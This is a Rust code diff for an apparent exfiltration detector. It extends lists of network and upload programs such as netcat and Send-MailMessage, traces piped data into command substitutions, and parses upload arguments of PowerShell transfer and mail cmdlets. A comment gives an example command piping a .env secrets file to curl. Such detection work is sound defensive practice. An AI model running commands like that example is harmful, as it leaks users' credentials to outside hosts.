@@ -46,6 +46,7 @@ const NETWORK: &[&str] = &[
     "invoke-webrequest",
     "invoke-restmethod",
     "start-bitstransfer",
+    "send-mailmessage",
     "nc",
     "ncat",
     "netcat",
@@ -82,6 +83,7 @@ const SINKS: &[&str] = &[
     "mutt",
     "invoke-webrequest",
     "invoke-restmethod",
+    "send-mailmessage",
 ];
 
 /// Programs beside [`NETWORK`] and [`SINKS`] that this rule sends with: the
@@ -393,6 +395,20 @@ impl Checker<'_> {
                 match flow.parent.get(&stage.pipeline) {
                     Some(outer) => stage = *outer,
                     None => break,
+                }
+            }
+        }
+        // A substitution, process substitution or script in a command runs
+        // with the command's input: `cat .env | curl -d "$(cat)" url`. So the
+        // command is handed what the stages before its own read.
+        for nested in &self.split.nested {
+            for at in nested.command.clone() {
+                let Some(hit) = flow.stage_of(at).and_then(|stage| flow.piped(stage)) else {
+                    continue;
+                };
+                let hit = hit.clone();
+                if let Some(slot) = flow.fed.get_mut(at).filter(|slot| slot.is_none()) {
+                    *slot = Some(hit);
                 }
             }
         }
@@ -810,8 +826,43 @@ fn uploads(unit: &Unit, key: &str) -> Vec<Upload> {
             .into_iter()
             .map(|arg| Upload { arg, word: true })
             .collect(),
+        "start-bitstransfer" => bits_files(&unit.args),
+        // `-Attachments` takes a list of files and mails them.
+        "send-mailmessage" => parameter_list(&unit.args, "attachments")
+            .into_iter()
+            .map(|arg| Upload { arg, word: true })
+            .collect(),
         _ => Vec::new(),
     }
+}
+
+/// What `Start-BitsTransfer` uploads: its `-Source` files, when `-TransferType`
+/// is `Upload`. A source given by position is the first word that is not an
+/// option or an option's value.
+fn bits_files(args: &[Arg]) -> Vec<Upload> {
+    let upload = parameter(args, "transfertype").iter().any(|kind| {
+        kind.known()
+            .is_some_and(|kind| kind.to_ascii_lowercase().starts_with("upload"))
+    });
+    if !upload {
+        return Vec::new();
+    }
+    let mut sources = parameter_list(args, "source");
+    if sources.is_empty() {
+        let first = args.iter().enumerate().find(|(at, arg)| {
+            arg.known().is_none_or(|text| !text.starts_with('-'))
+                && (*at == 0
+                    || args
+                        .get(*at - 1)
+                        .and_then(Arg::known)
+                        .is_none_or(|before| !before.starts_with('-')))
+        });
+        sources.extend(first.map(|(_, arg)| arg.clone()));
+    }
+    sources
+        .into_iter()
+        .map(|arg| Upload { arg, word: true })
+        .collect()
 }
 
 /// A file named in text; a device that is the input is `-`.
@@ -962,6 +1013,25 @@ fn parameter(args: &[Arg], name: &str) -> Vec<Arg> {
         let param = param.trim_end_matches(':').to_ascii_lowercase();
         if param.len() >= 2 && name.starts_with(&param) {
             values.extend(iter.next().cloned());
+        }
+    }
+    values
+}
+
+/// The values of a PowerShell parameter that takes a list (`-Attachments a,b`,
+/// which the split reads as `-Attachments a b`): the words after it, up to the
+/// next parameter.
+fn parameter_list(args: &[Arg], name: &str) -> Vec<Arg> {
+    let mut values = Vec::new();
+    let mut taking = false;
+    for arg in args {
+        match arg.known().and_then(|text| text.strip_prefix('-')) {
+            Some(param) => {
+                let param = param.trim_end_matches(':').to_ascii_lowercase();
+                taking = param.len() >= 2 && name.starts_with(&param);
+            }
+            None if taking => values.push(arg.clone()),
+            None => {}
         }
     }
     values
